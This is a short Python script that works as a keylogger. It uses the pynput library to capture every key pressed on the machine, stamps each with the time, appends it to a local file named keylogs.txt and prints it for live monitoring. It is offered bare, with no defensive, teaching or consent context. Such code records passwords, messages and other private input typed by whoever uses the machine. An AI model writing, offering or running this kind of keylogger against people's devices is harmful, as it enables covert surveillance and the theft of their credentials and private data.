from pynput import keyboard
from datetime import datetime
import logging

# Setup logging
logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

    try:
        # Normal key
        log_entry = f"{timestamp} [KEY: {key.char}]"
    except AttributeError:
        # Special key
        log_entry = f"{timestamp} [SPECIAL: {str(key).replace('Key.', '').upper()}]"

    logging.info(log_entry)
    print(log_entry)  # For real-time monitoring

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
